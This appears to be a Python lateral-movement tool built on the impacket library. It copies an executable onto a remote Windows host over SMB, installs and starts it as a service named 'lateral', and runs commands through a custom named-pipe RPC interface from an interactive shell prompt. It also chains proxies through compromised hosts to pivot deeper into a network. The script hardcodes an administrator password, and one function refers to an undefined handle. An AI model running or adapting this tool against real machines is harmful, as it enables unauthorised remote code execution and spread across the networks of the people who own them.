#!/usr/bin/python3
from impacket.examples import logger
from impacket import version
from impacket.dcerpc.v5 import transport, scmr
from impacket.dcerpc.v5.ndr import NULL
from impacket.crypto import encryptSecret
from impacket.smbconnection import SMBConnection
from impacket.uuid import uuidtup_to_bin
from impacket.dcerpc.v5.ndr import NDRULONG, NDRVaryingString, NDRCALL, NDRPOINTER, NDRUniConformantArray, NDRSTRUCT, NDRUniFixedArray
from impacket.dcerpc.v5.dtypes import LPWSTR, LPSTR, STR, SHORT, DWORD, PCHAR, LPBYTE, WSTR, LPDWORD
from impacket.dcerpc.v5.lsad import PCHAR_ARRAY
from impacket.dcerpc.v5.nrpc import UCHAR_ARRAY, PUCHAR_ARRAY
from impacket.dcerpc.v5.wkst import CHAR_ARRAY
from os import fork
from threading import Thread
from struct import unpack
from sys import argv, exit
import socket
from time import sleep


def copy(target, creds, source_path, target_path, share="c$", lmhash="", nthash=""):
	ip, port = target
	username, password, domain = creds
	smb = SMBConnection(remoteName='*SMBSERVER', remoteHost=ip, sess_port=port)
	smb.login(username, password, domain, lmhash, nthash)
	with open(source_path, "rb") as f:
		print("[*] copy")
		smb.putFile(share, target_path.replace('/','\\'), f.read)

def delete():
	pass

def start_service(target, creds, command, lmhash="", nthash=""):
	ip, port = target
	username, password, domain = creds
	print(ip, username, password, command, domain, port)
	aesKey = None
	remoteName = ip
	remoteHost = ip

	stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
	rpctransport = transport.DCERPCTransportFactory(stringbinding)
	rpctransport.set_dport(port)
	rpctransport.setRemoteHost(remoteHost)
	if hasattr(rpctransport, 'set_credentials'):
		rpctransport.set_credentials(username, password, domain, lmhash, nthash, aesKey)

	rpctransport.set_kerberos(False, None)

	dce = rpctransport.get_dce_rpc()
	dce.connect()
	dce.bind(scmr.MSRPC_UUID_SCMR)
	rpc = dce

	#create
	print("[*] creating")
	ans = scmr.hROpenSCManagerW(rpc)
	scManagerHandle = ans['lpScHandle']
	scmr.hRCreateServiceW(rpc, scManagerHandle, "lateral" + '\x00', "Lateral" + '\x00',
                                  lpBinaryPathName=command + '\x00')

	#start
	print("[*] starting")
	ans = scmr.hROpenServiceW(rpc, scManagerHandle, "lateral"+'\x00')
	serviceHandle = ans['lpServiceHandle']
	try:
		scmr.hRStartServiceW(rpc, serviceHandle)
	except:
		pass
	scmr.hRCloseServiceHandle(rpc, serviceHandle)

def stop_service(target, creds, lmhash="", nthash=""):
	ip, port = target
	username, password, domain = creds
	aesKey = None
	remoteName = ip
	remoteHost = ip

	stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
	rpctransport = transport.DCERPCTransportFactory(stringbinding)
	rpctransport.set_dport(port)
	rpctransport.setRemoteHost(remoteHost)
	if hasattr(rpctransport, 'set_credentials'):
		rpctransport.set_credentials(username, password, domain, lmhash, nthash, aesKey)

	rpctransport.set_kerberos(False, None)

	dce = rpctransport.get_dce_rpc()
	dce.connect()
	dce.bind(scmr.MSRPC_UUID_SCMR)
	rpc = dce

	#delete
	print("[*] delete")
	ans = scmr.hROpenServiceW(rpc, scManagerHandle, "lateral"+'\x00')
	serviceHandle = ans['lpServiceHandle']
	scmr.hRDeleteService(rpc, serviceHandle)
	scmr.hRCloseServiceHandle(rpc, serviceHandle)

def install_service(target, creds):
	copy(target, creds, "msrpc/server.exe", "/windows/server.exe")
	start_service(target, creds, "server.exe")



class SC_RPC_HANDLE(NDRSTRUCT):
    structure =  (
        ('Data','20s=""'),
    )
    def getAlignment(self):
        return 1

class DCERPCSessionError(Exception):
    def __init__(self, packet, error_code):
        print(123)
        pass

class Connect(NDRCALL):
    opnum = 0
    structure = (
        ('ip',STR),
        ('port',SHORT),
    )
class ConnectResponse(NDRCALL):
    structure = (
        ('socket',DWORD),
    )

class Disconnect(NDRCALL):
    opnum = 1
    structure = (
        ('socket',DWORD),
    )
class DisconnectResponse(NDRCALL):
    structure = ()

class Send(NDRCALL):
    opnum = 2
    structure = (
        ('socket',DWORD),
        ('data',STR),
        ('len',DWORD),
    )
class SendResponse(NDRCALL):
    structure = (
        ('len',DWORD),
    )

class Recv(NDRCALL):
    opnum = 3
    structure = (
        ('socket',DWORD),
        ('len',DWORD),
    )
class RecvResponse(NDRCALL):
    structure = (
        ('data',CHAR_ARRAY),
        ('len',DWORD),
    )

class Execute(NDRCALL):
    opnum = 4
    structure = (
        ('cmd',STR),
    )
class ExecuteResponse(NDRCALL):
    structure = (
        ('data',LPSTR),
    )

def msrpc(target, creds):
	ip, port = target
	username, password, domain = creds
	MSRPC_UUID_test  = uuidtup_to_bin(('00001111-2222-3333-4444-555566667777','1.0'))

	stringbinding = r'ncacn_np:%s[\pipe\lateral]' % ip
	rpctransport = transport.DCERPCTransportFactory(stringbinding)
	rpctransport.set_dport(port)
	rpctransport.setRemoteHost(ip)
	rpctransport.set_credentials(username, password, domain, "", "", None)

	dce = rpctransport.get_dce_rpc()
	dce.connect()
	dce.bind(MSRPC_UUID_test)
	return dce

def execute(cmd, target, creds):
	ip, port = target
	username, password, domain = creds
	#print(ip, username, password, domain, port)
	dce = msrpc((ip, port), (username, password, domain))
	execute = Execute()
	execute["cmd"] = cmd + "\x00"
	res = dce.request(execute)
	return str(res["data"], "cp866")

is_stop = False
def proxy(target_from, target_to, creds):
	ip_from, port_from = target_from
	ip_to, port_to = target_to
	username, password, domain = creds
	#print(target_from, target_to ,username, password, domain)

	def incoming(c, sock):
		global is_stop
		while True:
			recv = Recv()
			recv["socket"] = sock
			recv["len"] = 1024
			dce.call(recv.opnum, recv)
			res = dce.recv()
			data = res[ 4 : unpack("<I", res[-4:])[0]+4 ]
			if not data:
				print("incoming closed")
				is_stop = True
				break
#			print("<-" + str(data) + "[" + str(len(data)) + "]")
			c.send(data)
			#print("incoming")

	def outcoming(c, sock):
		global is_stop
		dce = msrpc((ip_from, port_from), (username, password, domain))
		while True:
			data = c.recv(1024)
			if not data or is_stop:
				print("outcoming closed")
				is_stop = True
				break
#			print("->" + str(data) + "[" + str(len(data)) + "]")
			send = Send()
			send["socket"] = sock
			send["data"] = data + b"\x00"
			send["len"] = len(data)
			res = dce.request(send, checkError=False)
			#res.dump()
			#print("outcoming")


	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	#s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind(('127.0.0.1', 0))
	s.listen(10)
	local_port = s.getsockname()[1]
	if fork() == 0:
		while True:
			c,info = s.accept()
			if fork() == 0:
				dce = msrpc((ip_from, port_from), (username, password, domain))
				connect = Connect()
				connect["ip"] = ip_to + "\x00"
				connect["port"] = port_to
				res = dce.request(connect, checkError=False)
				#res.dump()
				if res["socket"]:
					is_stop = False
					incoming_thr = Thread(target=incoming, args=(c,res["socket"]))
					outcoming_thr = Thread(target=outcoming, args=(c,res["socket"]))
					incoming_thr.start()
					outcoming_thr.start()
					while not is_stop:
					    sleep(1)
					#incoming_thr.join()
					#outcoming_thr.join()

					disconnect = Disconnect()
					disconnect["socket"] = res["socket"]
					res = dce.request(disconnect)
					#res.dump()
					exit()
			else:
				print(f"[*] proxying {info[0]}:{info[1]} -> {local_port}")
	return local_port

def check_pipe(target, creds):
	ip, port = target
	username, password, domain = creds
	try:
		MSRPC_UUID_test  = uuidtup_to_bin(('00001111-2222-3333-4444-555566667777','1.0'))
		stringbinding = r'ncacn_np:%s[\pipe\lateral]' % ip
		rpctransport = transport.DCERPCTransportFactory(stringbinding)
		rpctransport.set_dport(port)
		rpctransport.setRemoteHost(ip)
		rpctransport.set_credentials(username, password, domain, "", "", None)
		dce = rpctransport.get_dce_rpc()
		dce.connect()
		dce.bind(MSRPC_UUID_test)
		return True
	except Exception as e:
		return False

if __name__ == '__main__':
	target = argv[1]
	username = 'admin'
	password = 'qwerty=123'
	domain = '.'
	ip = target
	port = 445
	proxy_chains = []
	while True:
		line = input(f"{target}/> ")
		if line.startswith("shell "):
			_,new_target = line.split(" ")
			if not proxy_chains:
				port = proxy((ip, 445), (new_target, 445), (username, password, domain))
			else:
				port = proxy(("127.0.0.1", proxy_chains[-1]), (new_target, 445), (username, password, domain))
			proxy_chains.append(port)
			print(str(proxy_chains))
			target = new_target
			ip = "127.0.0.1"
		elif line in ('exit', 'quit', 'q'):
			break
		else:
			cmd = line
			if not check_pipe((ip, port), (username, password, domain)):
				install_service((ip, port), (username, password, domain))
			print( execute(cmd, (ip, port), (username, password, domain)) )
